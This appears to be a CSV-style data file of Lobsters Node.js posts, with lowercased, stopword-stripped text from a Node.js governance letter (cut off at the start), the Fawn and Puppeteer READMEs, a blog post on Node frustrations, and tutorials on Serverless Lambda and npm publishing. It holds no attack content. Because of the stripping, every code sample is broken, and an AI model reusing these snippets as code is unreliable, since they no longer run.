immature manner understatement however neither time place attempt address attempt smear defame unperson requesting directly fall sword receiving answer wanted board chosen make clear collectively think high moral ground matter already expressed believe made poor assessment fact made correct choice moral stance stood encouraged additional smear mei say board role relationship howeverthat barrier inclusivity effortsthis refrain often repeated social medium never made clear least justifiedby objective measure nodejs project healthier open outsider tenure leadership time history one great pleasure time showing celebrating conference circuit record number contributor overall per month overall unique per month issue tracker busy activity u stay subscribed firehose span globe core working group meeting difficult schedule usually end leaving people regularly work overcome language cultural barrier continue expandwhen survey contributor base collaborator list ctc membership see true diversity across many dimension claim barrier inclusivity building diverse contributor base odds prominent role project explosive growthmy assessment claim hindrance inclusivity effort hinge singular matter moderation control discourse occurs amongst technical team beginning strongly maintained technical team retain authority space independence also involves ability enforce rule social interaction discussion see fit lead disagreement individual would rather insert external arbiter moderation process arbiter earned right stand judgement technical team member held standard technical team member judged earn place projecton matter remain staunchly opposed dilution independence technical team continue advocate ability make critical decision question moral earned authority risk subversion organisational structure individual attracted project possibility pursuing personal agenda regardless impact project see current move direction week moderation policy proposal nodejstsc presenting risk expect everyone agree much right everyone else make case vilified attempt convince enough tsc prevent changesfurther regarding smear character circulate regularly social medium github would ask using basis judgement please ask supporting evidence making repeating smear educational experience watch caricatured narrative character grow monster today saddens people respect take narrative face value without bothering scratch surface see basis factthe use language systematic pattern avoid outline specific seen baseless smear large body text involving many hundred social interaction scattered nodejs project various repository github systematic behavioural problem exist difficult provide clear documentation themthreats independence technical groupwe face unprecedented move nodejs foundation board inject directly decisionmaking process message tsc voted wrong way get right outcomethis echo sentiment expressed community committee elsewhere since accusation must guilt fault lie inability tsc deal guilt credence paid possibility perhaps tsc evaluated fact reached consensus action necessaryi sympathy position nodejs foundation board tough time silicon valley environment particularly existing concern surrounding diversity inclusivity tolerance understand rumor similarly unacceptable behavior pose threat even absent evidence behavior said believe longterm interest nodejs foundation pander angry mob represent small fraction stakeholder demand rarely rational case believe majority outsider viewing situation bemusement best saddens recognition fact appeasing angry unverified demand activist lead greater demand le logical discussion issue accept precedent place future health project jeopardy demonstrated allow outsider adjust course suit personal private agenda long concoct story create outrage dispense mob justice without reproachwhile difficult believe important technical team continue assert independence board outside influence child need adult supervision treating u undermines much built last year erodes feeling ownership project instilled team collaboratorsthe threat future leadership projectfinally want address critical problem overlooked pose big problem future grow enable support leadership difficult environmentmy tenure leadership easily represents difficult year life challenge face forced grow way never expected thankful chance meet challenge however even though taken toll health glad experience look backone task leader particularly serving role bridge board technical team involved maintaining separation independence also shielding technical team intense corporate personal politics constantly exists exercised within around foundation role forced take strong position many issue stand pressure applied many different direction felt best support technical team member sure put people offside unfortunate consequence good intention uncommon one say made enemy much engage difficult conversation involve surfacing many disagreement difficult sometimes impossible resolvehaving involve wide variety decisionmaking process inevitably requires make tough call connect way controversial discussion sure current leadership attest awkward position found difficult conversation navigate including one never pretend limitation skill intellectually emotionally required navigate tough water consider sheer number drama controversy difficult conversation involved consider thousand page text left littered across github forum use get thing done come conclusion best reason find force resignation list infraction given weight content could dredge either trying hard pretty proud keeping level head imaginedthat aside greatest concern role leadership coming consequence action currently pursued painted corner regarding leader going available message board chosen send today rightly interpreted mob come calling narrative evil strong enough regardless objective fact foundation back developer leader foundation signalling stand u thing get tough combine difficult thankless job result exercising duty could careerkilling path forward leadership likely individual comfortable giving whim outside activist whatever demand slowly transforming project something entirely different focused matter associated making nodejs successindividuals capable shrewd enough avoid responsibilityindividuals capable take responsibility exercise backbone standing pressure group mob tactic get taken support structure either abandon turn themthis kind pattern evidenced across professionalised open source sphere nodejs set new low bar surprised quality leader become difficult find become unconvinced exercise leadership duty personal interestthis great challenge modern open source sad forced involved setting current trajectory hope open source practitioner find space future necessary dialog find way hole dugin summaryobviously hope agree action unwarranted based flawed andor irrelevant claim misbehaviour based malicious intent b allowing course action acceptable part governance procedure detrimental consequence future health projecti ask ctc reject motion tsc reject demand board suspension technical team send signal independence critical success project despite accusation angry mobthank dignified word reading far
263,Lobsters,nodejs,Node.js programming,Fawn - Transactions in MongoDB using two-phase commits,https://github.com/e-oj/Fawn,fawn transaction mongodb using twophase commits,fawn promise based library transaction mongodb medium article view github getting started nodejs mongodb usage example gridfs api fawninit db collection option initialize fawn mongoose connection string mongoose connection option note running multiple apps connected db provide string value collection unique app avoid situation one app roll back unfinished transaction another app fawntask create fawn task taskinitmodel modelname schema initialize model schema mongoose schema validation tasksave model doc save document taskupdate model condition data update document mongoose mongodb mongoose mongodb taskoptions option add option update task mongoose taskremove model condition remove document collection mongoose tasksavefile filepath option save file db via gridfs gridstore option file object taskremovefile option remove file db via gridfs gridstore option gridstore taskrun option run task nodemongodbnative mongoose result reference fawnroller get roller object rollerroll roll back incomplete transcations miscellaneous using result previous step subsequent step result test,longer time actively maintain project transaction added mongodb informed user varying reason stuck older version database still depend library need volunteer tackle open issue interested please open issue indicating interest happy add project thanks advance fawn promise based library transaction mongodb fawn provides ability carry edits mongodb database series step error occurs step database returned initial state state transaction started based two phase commit system described mongodb doc check medium article detailed look view github getting started install nodejs mongodb start mongodb terminal mongod npm install fawn usage var fawn require fawn fawninit mongodb var mongoose require mongoose mongooseconnect mongodb fawninit mongoose example say two bank account one belongs john smith belongs broke as would like transfer john smith broke as assuming first name last name pair unique might look like var task fawntask assuming account account collection taskupdate account firstname john lastname smith inc balance update account firstname broke lastname as inc balance run function result task complete result first operation var firstupdateresult result result second operation var secondupdateresult result catch function err everything rolled back log error caused failure consolelog err file saved removed gridfs might update user profile image var newimageid somemongodbid tasksavefile pathtonewprofileimg id newimageid filename profilepng removefile id oldimageid update user id userid profileimageid newimageid run function result var newimgfile result consolelog newimgfilefilename profilepng catch function err everything rolled back log error caused failure consolelog err default task run using native driver opt mongoose prefer chain function call nt taskupdate account firstname broke lastname as inc balance taskupdate account firstname lastname plug inc balance taskrun usemongoose true function update complete catch function err everything rolled back log error caused failure consolelog err server could crash task complete use roller rollback incomplete transaction starting server assuming fawn initialized see fawninit var roller fawnroller rollerroll function start server api fawninit db collection option initialize fawn db required mongoose instance connection string collection optional name collection used internally fawn store transaction option optional lol connection option mongoose connection option note running multiple apps connected db provide string value collection unique app avoid situation one app roll back unfinished transaction another app using mongoose project initialize fawn mongoose var mongoose require mongoose mongooseconnect mongodb remember collection optional fawninit mongoose fawncollectionnameifyouwanttospecify without mongoose initialize fawn like option object http mongoosejscomdocsconnectionshtml option var option user tehhuosekat pas tehkittipasswrod var collection fawncollectionnameifyouwanttospecify remember collection option optional fawninit mongodb collection null option null fawntask create fawn task return new task intitializing fawn create task like taskinitmodel modelname schema initialize model schema modelname required name collection associated model schema optional object passed mongoose schema also see validation note model validation work run task usemongoose set true initalizes mongoose model provided schema using mongoose define model mongoose wherever possible model defined mongoose function called mongoose throw overwritemodelerror defined fawn fawn throw error model defined var schema name type string required true special title string year number taskinitmodel comedian schema save comedian name kevin hart special title year run usemongoose true function result consolelog result save operation comedian model validate schema tasksave model doc save document model required name collection saving mongoose model mongoose document doc optional object save mongoose document valid var car mongoosemodel car new schema make string year number var toyota new car make toyota year tasksave car make toyota year tasksave car make toyota year tasksave car toyota tasksave car toyota tasksave toyota note change made database call taskrun taskupdate model condition data update document model required name collection updating mongoose model mongoose document condition required mongoose mongodb data optional data update mongoose mongodb valid var car mongoosemodel car new schema make string year number taskupdate car make toyota year taskupdate car make toyota year carsfindone make toyota function toyota taskupdate toyota year note change made database call taskrun taskoptions option add option update task option required update option mongoose option viasave boolean attach update call shown taskupdate car make toyota year option multi true also valid taskupdate car make ford year taskoptions multi true viasave option allows update mongoose document using save function useful want trigger mongoose pre save hook option work must run task using mongoose mongoose var doc somemongoosedocument docsomeproperty newvalue docsave consolelog fawn var doc somemongoosedocument var newdoc doctoobject newdocsomeproperty newvalue taskupdate doc newdoc option viasave true run usemongoose true consolelog note change made database call taskrun taskremove model condition remove document collection model required name collection deleting mongoose model mongoose document condition optional mongoose valid var car mongoosemodel car new schema make string year number remove car year taskremove car year taskremove car year carsfindone year function car remove car taskremove car note change made database call taskrun tasksavefile filepath option save file db via gridfs filepath required path file option optional gridstore option save file filepath database using gridfs result operation saved file object see file object tasksavefile pathtosomefile filename astringfilenameext update somecollection updateconditions updatedata run function result var file result consolelog filefilename astringfilenameext catch function err everything rolled back log error caused failure consolelog err note change made database call taskrun taskremovefile option remove file db via gridfs option required gridstore option remove file match option database using gridfs result operation gridstore instance ignored see gridstore taskremovefile id fileid update somecollection updateconditions updatedata run function result need gridstore instance var gridstore result catch function err everything rolled back log error caused failure consolelog err note change made database call taskrun taskrun option run task option usemongoose boolean return promise database change occur must call taskrun function return promise success promise resolved array containing nodemongodbnative mongoose result operation sequence error occurs promise rejected error caused failure taskupdate account firstname john lastname smith inc balance update account firstname broke lastname as inc balance run run usemongoose true function result task complete result first operation var firstupdateresult result result second operation var secondupdateresult result catch function err everything rolled back log error caused failure consolelog err result reference fawnroller get roller object return roller object initializing fawn get roller like var roller fawnroller rollerroll roll back incomplete transcations case server crash fatal error use roller return document affected incomplete transaction original state used task progress usually server startup var roller fawnroller rollerroll function start server miscellaneous using result previous step subsequent step might want use result previous step subsequent step using template object key ojfuture syntax ojfuture propertyn tasksave kid name full brody obi result id somemongoid name full brody obi update parent id parentid firstchild id ojfuture fullname ojfuture run usemongoose true function task complete catch function err everything rolled back log error caused failure consolelog err use feature need know exact format step result reference result test test module start mongodb terminal mongod cd project directory run npm test
264,Lobsters,nodejs,Node.js programming,Puppeteer: a high-level Node API to control headless Chrome,https://github.com/GoogleChrome/puppeteer,puppeteer highlevel node api control headless chrome,puppeteer devtools protocol headless timeline trace http trypuppeteerappspotcom getting started installation environment variable puppeteercore puppeteer v puppeteercore usage maintenance lts puppeteer api example http examplecom examplejs example hnjs example getdimensionsjs default runtime setting us headless mode headless mode option run bundled version chromium creates fresh user profile clean every run resource debugging tip function chromium bug ndb npx usage typescript definitelytyped contributing puppeteer contributing guide faq q maintains puppeteer contributing q status crossbrowser support older experiment current approach q puppeteer goal principle devtools protocol chromium principle speed security stability simplicity q puppeteer replacing seleniumwebdriver jestpuppeteer easy start q puppeteer vxxx work chromium vyyy indivisible entity q chromium version puppeteer use revisionsts omahaproxy q firefox version puppeteer use firefox nightly revisionsts q considered navigation navigation anything change page url anchor navigation history api puppeteer work seamlessly singlepage application q difference trusted untrusted input event trusted event untrusted event input event generated puppeteer trusted fire proper accompanying event q feature puppeteer support video playbackscreenshots likely fail chromium mediarelated limitation option support http live streaming hl q trouble installing running puppeteer test environment look help troubleshooting q trytest prerelease version puppeteer q question ask,puppeteer puppeteer node library provides highlevel api control chrome chromium devtools protocol puppeteer run headless default configured run full nonheadless chrome chromium thing manually browser done using puppeteer example get started generate screenshots pdfs page crawl spa singlepage application generate prerendered content ie ssr serverside rendering automate form submission ui testing keyboard input etc create uptodate automated testing environment run test directly latest version chrome using latest javascript browser feature capture timeline trace site help diagnose performance issue test chrome extension give spin http trypuppeteerappspotcom getting started installation use puppeteer project run npm puppeteer yarn add puppeteer note install puppeteer downloads recent version chromium mac linux win guaranteed work api skip download download different browser see environment variable puppeteercore since version publish puppeteercore package version puppeteer nt download browser default npm puppeteercore yarn add puppeteercore puppeteercore intended lightweight version puppeteer launching existing browser installation connecting remote one sure version puppeteercore install compatible browser intend connect see puppeteer v puppeteercore usage puppeteer follows latest maintenance lts version node note prior puppeteer required least node version rely node starting puppeteer start rely node example use asyncawait supported node greater puppeteer familiar people using browser testing framework create instance browser open page manipulate puppeteer api example navigating http examplecom saving screenshot examplepng save file examplejs const puppeteer require puppeteer async const browser await puppeteerlaunch const page await browsernewpage await pagegoto http examplecom await pagescreenshot path examplepng await browserclose execute script command line puppeteer set initial page size defines screenshot size page size customized pagesetviewport example create pdf save file hnjs const puppeteer require puppeteer async const browser await puppeteerlaunch const page await browsernewpage await pagegoto http newsycombinatorcom waituntil await pagepdf path hnpdf format await browserclose execute script command line see pagepdf information creating pdfs example evaluate script context page save file getdimensionsjs const puppeteer require puppeteer async const browser await puppeteerlaunch const page await browsernewpage await pagegoto http examplecom get viewport page reported page const dimension await pageevaluate return width documentdocumentelementclientwidth height documentdocumentelementclientheight devicescalefactor windowdevicepixelratio consolelog dimension dimension await browserclose execute script command line see pageevaluate information evaluate related method like evaluateonnewdocument exposefunction default runtime setting us headless mode puppeteer launch chromium headless mode launch full version chromium set headless option launching browser const browser await puppeteerlaunch headless false default true run bundled version chromium default puppeteer downloads us specific version chromium api guaranteed work box use puppeteer different version chrome chromium pas executable path creating browser instance const browser await puppeteerlaunch executablepath pathtochrome also use puppeteer firefox nightly experimental support see puppeteerlaunch information see article description difference chromium chrome article describes difference linux user creates fresh user profile puppeteer creates browser user profile clean every run resource debugging tip turn headless mode sometimes useful see browser displaying instead launching headless mode launch full version browser using headless false const browser await puppeteerlaunch headless false slow slowmo option slows puppeteer operation specified amount millisecond another way help see going const browser await puppeteerlaunch headless false slowmo slow capture console output listen console event also handy debugging code pageevaluate pageon console msg consolelog page log msgtext await pageevaluate consolelog url locationhref use debugger application code browser two execution context nodejs running test code browser running application code tested let debug code application code browser ie code inside evaluate use devtools true launching puppeteer const browser await puppeteerlaunch devtools true change default test timeout jest jestsettimeout jasmine jasminedefaulttimeoutinterval mocha thistimeout nt forget change test use function add evaluate statement debugger inside add debugger existing evaluate statement await pageevaluate debugger test stop executing evaluate statement chromium stop debug mode use debugger nodejs let debug test code example step await pageclick nodejs script see click happen application code browser note wo nt able run await pageclick devtools console due chromium bug want try something add test file add debugger test eg debugger await pageclick targetblank set headless false run node inspectbrk eg node inspectbrk nodemodulesbinjest test chrome open chrome inspect device click inspect newly opened test browser type resume test execution debugger hit debug test browser enable verbose logging internal devtools protocol traffic logged via debug module puppeteer namespace basic verbose logging env debug puppeteer node scriptjs protocol traffic rather noisy example filter network domain message env debug puppeteer env debugcolorstrue node scriptjs grep v network debug puppeteer node code easily using ndb npm install g ndb even better use npx add debugger puppeteer node code add ndb npx ndb test command example ndb jest ndb mocha npx ndb jest npx ndb mocha debug test inside chromium like bos usage typescript recently completed migration move puppeteer source code javascript typescript currently working shipping type definition typescript puppeteer npm package work complete recommend installing puppeteer type definition definitelytyped repository npm install savedev typespuppeteer type see appearing puppeteer source code based great work contributed typespuppeteer package really appreciate hard work people put providing high quality typescript definition puppeteer user contributing puppeteer check contributing guide get overview puppeteer development faq q maintains puppeteer chrome devtools team maintains library love help expertise project see contributing q status crossbrowser support official firefox support currently experimental ongoing collaboration mozilla aim support common endtoend testing use case developer expect crossbrowser coverage puppeteer team need input user stabilize firefox support bring missing apis attention puppeteer onwards specify puppeteerlaunch product firefox run puppeteer script firefox nightly without additional custom patch older experiment required patched version firefox current approach work stock firefox continue collaborate browser vendor bring puppeteer support browser safari effort includes exploration standard executing crossbrowser command instead relying nonstandard devtools protocol used chrome q puppeteer goal principle goal project provide slim canonical library highlight capability devtools protocol provide reference implementation similar testing library eventually framework could adopt puppeteer foundational layer grow adoption headlessautomated browser testing help dogfood new devtools protocol feature catch bug learn pain point automated browser testing help fill gap adapt chromium principle help u drive product decision speed puppeteer almost zero performance overhead automated page security puppeteer operates offprocess respect chromium making safe automate potentially malicious page stability puppeteer flaky leak memory simplicity puppeteer provides highlevel api easy use understand debug q puppeteer replacing seleniumwebdriver project valuable different reason seleniumwebdriver focus crossbrowser automation value proposition single standard api work across major browser puppeteer focus chromium value proposition richer functionality higher reliability said use puppeteer run test chromium eg using communitydriven jestpuppeteer probably testing solution good point compared webdriver puppeteer requires zero setup come bundled chromium version work best making easy start end day better test running chromiumonly test puppeteer eventdriven architecture remove lot potential flakiness need evil sleep call puppeteer script puppeteer run headless default make fast run puppeteer also expose browser context making possible efficiently parallelize test execution puppeteer shine come debugging flip headless bit false add slowmo see browser even open chrome devtools inspect test environment q puppeteer vxxx work chromium vyyy see puppeteer indivisible entity chromium version puppeteer bundle specific version chromium version guaranteed work artificial constraint lot work puppeteer actually taking place chromium repository typical story however oftentimes desirable use puppeteer official google chrome rather chromium work install puppeteercore version corresponds chrome version example order drive chrome puppeteercore use npm tag npm install puppeteercore q chromium version puppeteer use look chromium entry revisionsts find corresponding chromium commit version number search revision prefixed r omahaproxy find release section q firefox version puppeteer use since firefox support experimental puppeteer downloads latest firefox nightly puppeteerproduct environment variable set firefox also value firefox revisionsts latest puppeteer nt tied particular firefox version fetch firefox nightly part puppeteer installation puppeteerproductfirefox npm puppeteer yarn add puppeteer q considered navigation puppeteer standpoint navigation anything change page url aside regular navigation browser hit network fetch new document web server includes anchor navigation history api usage definition navigation puppeteer work seamlessly singlepage application q difference trusted untrusted input event browser input event could divided two big group trusted v untrusted trusted event event generated user interacting page eg using mouse keyboard untrusted event event generated web apis eg documentcreateevent elementclick method website distinguish two group using eventistrusted event flag sniffing accompanying event example every trusted click event preceded mousedown mouseup event automation purpose important generate trusted event input event generated puppeteer trusted fire proper accompanying event reason one need untrusted event always possible hop page context pageevaluate generate fake event await pageevaluate documentqueryselector button typesubmit click q feature puppeteer support may find puppeteer behave expected controlling page incorporate audio video example video playbackscreenshots likely fail two reason puppeteer bundled chromium chrome default inherits chromium mediarelated limitation mean puppeteer support licensed format aac however possible force puppeteer use separatelyinstalled version chrome instead chromium via executablepath option puppeteerlaunch use configuration need official release chrome support medium format since puppeteer configuration control desktop version chromiumchrome feature supported mobile version chrome supported mean puppeteer support http live streaming hl q trouble installing running puppeteer test environment look help troubleshooting guide various operating system list required dependency q trytest prerelease version puppeteer check repo install latest prerelease npm npm save puppeteer next please note prerelease may unstable contain bug q question ask many way get help puppeteer make sure search channel posting question
265,Lobsters,nodejs,Node.js programming,The Frustration and Loneliness of Server-Side Javascript Development (2016),https://kev.inburke.com/kevin/one-year-of-node-js/,frustration loneliness serverside javascript development,shyp hot take learning curve many framework post consistently fire millisecond early underlying librato library using also eventemitter crashed process unhandled uncaught exception take second boot server production majority time spent requiring file sped build time month framework sleeping post put request reason problem sail nasty tl problem hang inexplicably spending minute wondering stubbing system time caused csv writing fail crashed server ifwhen slack returned html instead json phased redis altogether transaction library nt way time outcancel connection acquisition wrote patch wrote job queue go separate downstream server benchmarking pprof summary hard distinguish good library bad one really bad problem loneliness making build faster intermittent test failure available hire,hired december sixth engineer shyp shyp run nodejs server pretty frustrating journey wanted share experience hot take learning curve many framework post initially running node timer would consistently fire millisecond early called settimeout duration millisecond timer would fire millisecond asked nodejs freenode channel told fault using ancient version node month old time get long term stable version made timeoutbased test difficult write every test set timeouts longer wrote metric library published librato expect background metric publishing daemon silently swallowlog error one day librato outage returned request unbeknownst underlying librato library using also eventemitter crashed process unhandled caused minute downtime api advice nodejs website crash process uncaught exception application model controller nt seem particularly large consistently take second boot server production majority time spent requiring file obviously try crash fix crash see ca nt take second downtime someone sent input nt expecting asked nodejs mailing list got mostly peanut recently go core team sped build time month discovered framework sleeping post put request reason previously written problem sail going omit upgraded node spending day dealing nasty tl problem observed server consuming ram accompanying speed cpu utilization throughput increase left wondering benefit got upgrading took two month figure generate npm shrinkwrap file produced reliable change tried update often attempting modifyupdate would change field every single dependency sinon library appears one popular way stub system time default method stubbing usefaketimers lead many library hang inexplicably noticed spending minute wondering stubbing system time caused csv writing fail way debug add consolelog statement deeper deeper level since ca nt ever hit ctrlc print stack trace take core dump library used send message slack crashed server ifwhen slack returned html instead json redis provider changed something nt know since version number stayed redis instance cause redis connection library use crash process unhandled event message idea happens tied number connection open keep close eye number concurrent redis connection eventually phased redis altogether database framework nt support transaction write transaction library underlying database driver nt way time outcancel connection acquisition thread wait forever connection become available wrote patch nt gotten closer merging week published new npm package patch submitted upstream wrote job queue go could nt benchmark using existing node server downstream server node server slow basic express app would take average process incoming request respond concurrent inflight request write separate downstream server benchmarking last week noticed integration server frequently running memory normally use memory saw would accumulate swap second think app served thirty request total time frame nothing unusual request amount traffic sent http database time frame amount data kilobyte nt tool like pprof ca nt take heap dump box memory point summary could argue certainly could say sail chose bad library picked better part problem node ecosystem hard distinguish good library bad also listed problem pound head hour day frustrating debugging least six different library point move beyond one library bad start worrying bigger picture library problem author nt know better language standard library make difficult write good library nt think help could argue fast growing company problem language framework chose maybe really doubt job queue line go code written scratch one really bad problem two month development race detector caught production b got pointed right answer irc pretty quickly could also argue bad engineer better engineer would nt problem ca nt rule certainly nt think case javascript community get lot credit work code conduct creating awesome conference creating welcoming thoughtful community overwhelming feeling gotten past year loneliness constantly feel like person running problem library problem production person care consequence eg waiting forever connection become available frequently posting github irc getting response getting told way absence feedback left wondering everyone else getting along user learned lot debugging node application making build faster finding fixing intermittent test failure available speak consult company event learned also interested figuring solution problem buy coffee beer chat time liked read available hire
266,Lobsters,nodejs,Node.js programming,"How to create a simple REST web-service with Node, AWS Lambda and the Serverless Framework",https://medium.com/the-reading-room/how-to-create-a-simple-rest-web-service-with-node-aws-lambda-and-the-serverless-framework-4730c88cd39a,create simple rest webservice node aws lambda serverless framework,create simple rest webservice node aws lambda serverless framework aws lambda λ serverless framework tl dr http service upon service get get post javascript stuff getemails getemail sendemail serverlessyaml service provider name runtime region memorysize timeout environment function getemail handler event http path method cors origin one full provider environment variable environment environment example envyml dev gmailcom emailsmtphost emailsmtpusername gmailcom emailsmtppassword emailsmtpport emailsmtptls lambda handler event example context example http docsawsamazoncomlambdalatestdgnodejsprogmodelcontexthtml callback getemail const createemailservices const getemail callback success catch callback error contextcallbackwaitsforemptyeventloop const emailservices createemailservices statuscode header body statuscode header body contenttype accesscontrolalloworigin accesscontrolallowcredentials invoking locally npm install serverless invoke local deployment video several way serverless awsaccesskeyid awssecretaccesskey serverless deploy get http get http index post http troubleshooting papertrail,create simple rest webservice node aws lambda serverless frameworkin article explain create rest webservice written nodejs deployed aws lambda λ also going use serverless framework make deployment really easytl dr write javascript function called service write function handle http request look like create small serverlessyaml file run serverless deploy voila cloud codeexample code http upon serviceswhat better way use powerful microservice platform create service call another service case going create rest webservice get email email server classic allows send mail practically useless like idea posting emailwhat want end lovely scalable faulttolerant webservice endpoint get email get list email inbox header detail get email index get particular email body post email send accept return jsonaws lambda function invokedtriggered via another aws service example triggered document added dynamodb event something processed sqs queue want process request sent http endpoint create aws api gatewaythe api gateway allow configure allowed structure request sent endpoint allowing gateway validate provide error response http response code etc requires lot configuration however simplify thing allow handle application instead aws introduced proxy integration api gateway mean choose option configure proxy resource whole http request get sent lambda function turn function must return response content http status code header want return gateway little possiblejavascript stuffso created javascript module emailservicesjs expose function getemails array index subject date return array latest email sitting email server excluding body getemail index subject date body give specified emailsendemail subject body sends like much want open world use serverless framework help achieve thatserverlessyamlthe first thing using serverless framework create serverlessyaml tell lambda function want event want trigger eg http schedule http method want use aws security group put etc option offered file explained bit comprehensively minimal one serverless definition file defines lambda function deployed aws using serverless framework http serverlesscomservice emailservicesprovider name aws runtime region memorysize timeout environment file envyml self providerstage function getemail handler lambdahandlersgetemail event http path email id method get cors origin one full provider section specify environment want deploy one great feature serverless framework abstraction give across different platform clever solution make choice platform le important azure turn cost effective year time nice switch option without much painenvironment variablesit worth noting environment bit yaml environment file envyml self providerstage way providing environment variable value deployed code line telling serverless insert value file called envyml example specifically object within file named deployment stage whenever deploy code aws serverless deploy particular stage default dev mechanism used api gateway serverless help organise different deployment stage project may production qa uat wish deploy code environment separately project file called envyml contains yaml like environment variable dev popgmailcom gmailcom blahblahblahblah true emailsmtphost smtpgmailcom emailsmtpusername gmailcom emailsmtppassword blahblahblahblah emailsmtpport emailsmtptls true committed github repo playing along need write value applied environment variable within lambda process use variable later configure emailservices modulelambda handlersin serverlessyaml file lambda function specify thing like http method handle get post etc origin api gateway accept request eg care rest endpoint path look like also need specify javascript function handle function may following responsibility pulling parameter request eventpathparameters eventquerystringparameters pulling request body eventbody pulling authority header request checked eventheadersauthorization creating response whatever come service eg header body case serverless going expect find javascript module lambdahandlersjs export function called getemail try putting folder referring like handlerslambdagetemail anything like work keep alongside serverlessyamlthese lambda handler function get called following three parameter event object containing detail request header parameter useragent etc example context object containing detail lambda function environment example http docsawsamazoncomlambdalatestdgnodejsprogmodelcontexthtml callback called response sent back client using proxy mode api gateway object return need statuscode header object bodyso created file called lambdahandlersjs created function like getemail event context callback contextcallbackwaitsforemptyeventloop false const emailservices createemailservices get index parameter event const index eventpathparametersid emailservicesgetemail index email create success response object containing email got back emailservicesgetemail callback null responsessuccess email catch error callback null responseserror error worth basically always set false unless understand nodejs event loop confident code dependency leave setinterval processnexttick stuff waiting around lambda function complete even call callback receive timeout error lambda function used contextsucceed method deprecatedconst emailservices createemailservices function created get environment variable pas emailservices function createemailservices configure email service const emailservices new emailservices onso need lambdahandlersjs add two function handle getemails sendemail plus couple template response response success data return statuscode code header responseheaders body jsonstringify data error error return statuscode errorcode header responseheaders body jsonstringify error sort response header allow crossorigin request const responseheaders contenttype applicationjson required cors support work accesscontrolalloworigin required cooky authorization header http accesscontrolallowcredentials true full lambdahandlersjsonce function place first try calling locally make sure behaveinvoking locallyinstall serverless cli call commandline npm install g use like serverless invoke local f getemailappend p examplejson want send parameter body function json file need look something like body gmailcom gmailcom subject lambda body saying pathparameters header note body get passed string unfortunately serialise json file one messy lineif happy function handle request see fit deploy deploy nowdeploymentwe need give serverless credential mess around aws account guide even video aws account already need go iam section create new user account serverless use create new lambda api gateway service need user programmatic access ie user us aws api rather console webpage serverless recommends give new user full administratoraccess policy seems excessive depending paranoia either use access advisor iam narrow policy need need lot make copy download csv access key id secret access key keep safe somewherethere several way provide key serverless favourite way create file called credential extension directory called aws within home directory eg c usersleroyjenkinsawscredentials add line serverless key access key id secret key made copy earliernow get back project directory call serverless deploy awsprofile serverlessif plan come together list endpoint created like get http http index post http serverless code cluttering cloud somewhere tidy little low cost fault tolerant microservice provides service nobody wanted casetroubleshootingif get problem service expect good place start go aws console find api gateway apis api stage dev whatever enable cloudwatch log service log found cloudwatch part aws console consolelog stdoutstderr log end beware extra cost accrued get lot log currently per gb ingested per gb archived per month alternatively application use something like papertrail write log service free know go
267,Lobsters,nodejs,Node.js programming,Bootstrapping a JavaScript Library,https://monades.roperzh.com/bootstrapping-javascript-library/,bootstrapping javascript library,simplicity start small nodejs semantic versioning post subject mit tutorial version control concept best practice multiple template mocha beginner guide creating readme markdown tutorial complete reference dillingerio github gitlab bitbucket npm doc check resource twitter email subscribe,felt compelled write read many experienced programmer complain qualityquantity npm package way helpful instead providing solution problem discourages new library author get started unfair whole community imagine many good package losing imagine many potential os collaborator lost worried screwing want write first javascript library please afraid post try walk process starting like make clear main rule governing guide simplicity writing publishing node package painless process possible go overboard tool available enhance workflow tool extremely helpful slow beginning premise start small add tool need need nodejs updated version npm git time writing using nodejs npm code contained single folder mylib indexjs testjs file indexjs file entry point application consumer library get require import testjs file contains test file lying around related configuration documentation project note project grows complexity may want organize code bit differently case convention create folder called src lib contain multiple source file folder named test test go ahead create folder contain project along indexjs testjs file every project packagejson file contains metadata related project used npm order identify project well handle project dependency npm come handy command npm init help generate packagejson interactive way running command prompted fill couple value describe project besides basic stuff package name author etc two thing look try thoughtful versioning package possible always try follow semantic versioning license making package available jeff atwood good post subject mit license good option leave test command git repository entry empty going fill later initializing project npm init look like npm init utility walk creating packagejson package name mylib version description short description library entry point indexjs test command git repository keywords relevant keywords author roberto dip license isc mit everything went right packagejson file root project sure version control need project please read tutorial version control intended file people edit generated file committed version control example commit binary file result compilation file class file also commit pdf file generated text formatting application rule commit source file pdf file generated michael ernst version control concept best practice tell git ignore certain file project creating file called gitignore file contains series pattern letting git know file folder want track multiple template lazy type enough temporary file created osx dsstore file related development nodemodules since done progress good idea start tracking change first init repository git init initialized empty git repository projectsmylibgit add commit file git add git commit initial commit master rootcommit initial commit file changed insertion create mode gitignore create mode packagejson set test suite need library perform assertion least builtin assert enough tool run report assertion like simplicity mocha note future test grow complexity switch magnificent test library javascript thing need install via npm npm install savedev mocha make life easier run tell npm run test type npm test command filling test script packagejson script test mocha note black magic script object allows define arbitrary command npm run command since test command used frequently npm allows omit run call test command directly testjs file require assertion library const assert require assert require library const mylib require describe library describe mylib function describe hello function return string representing greeting function assertequal mylibhello hello run test command previously defined everything right test fails strange thing say library need export hello method open indexjs define moduleexports hello return hello test pas important thing note fact easily require invoke library method allowing test different output always good idea cover many edge make code solid long term make confident making future change done progress commit change tip always good idea git add git commit right next encourage check safer alternative like adding git diff git add p mix readme let world know project contribute use additional information want future contributor know beginner guide creating readme good source learn good readme look like freedom write format standard format markdown hard time syntax tutorial complete reference tip dillingerio online markdown editor let preview editing real time note project file named uppercase letter old convention decided stick rationale make file easier find somebody new project readmemd file forget commit git add readmemd git commit add readme soon people start using package find bug improvement new feature etc beauty open source software good idea make code public world allowing people contribute git publishing repository hosted git server like github gitlab bitbucket really matter project hosted always switch later order publish source need create account service mentioned create repository grab url repository push change git remote add origin yoururlhere git push origin master since repository url hand fill git entry packagejson git yoururlhere publishing sound scary process boil login npm login register npm adduser npm user run npm publish publish package enjoy detailed instruction npm doc idea guide get started developing package distribution concerned process may vary little based environment want support nodejs browser following guide package ready run nodejs browser depending write code want support environment check resource still question feel free reach twitter email subscribe try post week interesting stuff programming nix web like notified new post go subscribe form
